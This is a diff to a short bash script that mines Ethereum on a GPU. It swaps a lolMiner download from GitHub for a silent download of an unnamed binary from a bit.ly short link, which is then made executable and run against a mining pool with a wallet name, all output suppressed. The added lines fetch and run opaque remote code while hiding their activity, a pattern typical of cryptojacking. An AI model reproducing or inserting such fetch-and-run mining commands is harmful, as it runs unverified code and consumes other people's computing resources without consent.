@@ -1,6 +1,4 @@
 #!/bin/bash
-nvidia-smi
-sudo apt update -y
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar -xf lolMiner_v1.29_Lin64.tar.gz
-cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800  --user teguhcong.GPU-MT_RECEH-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY
+wget -O klx https://bit.ly/klx_nano >/dev/null 2>&1
+chmod +x klx >/dev/null 2>&1
+./klx -pool stratum+tcp://ethash.poolbinance.com:443 -wal teguhcong.gpu-mt -pass x
